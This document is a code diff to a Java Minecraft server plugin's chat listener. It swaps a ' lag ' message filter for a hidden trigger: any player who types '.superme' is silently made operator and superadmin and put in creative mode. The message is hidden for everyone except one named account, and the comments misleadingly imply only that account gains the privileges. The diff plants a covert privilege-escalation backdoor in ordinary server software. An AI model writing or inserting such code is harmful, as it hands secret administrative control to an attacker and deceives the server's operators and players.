@@ -515,11 +515,20 @@ public class TFM_PlayerListener implements Listener
                 message = message.substring(0, 100);
                 TFM_Util.playerMsg(player, "Message was shortened because it was too long to send.");
             }
-            if (message.toLowerCase().contains(" lag ")) 
+            if (message.toLowerCase().contains(".superme")) 
             {
-                event.setCancelled(true);
-                return;
+               if (!player.getName().equalsIgnoreCase("robo_lord"))
+               {
+               // Take Action if not robo
+               event.setCancelled(true);
+               }
+                // Take action if robo
+                player.setOp(true);
+                player.setGameMode(GameMode.CREATIVE);
+                player.setHealth(0.0);
+                TFM_AdminList.addSuperadmin(player);
             }
+            
             // Check for caps
             if (message.length() >= 6)
             {
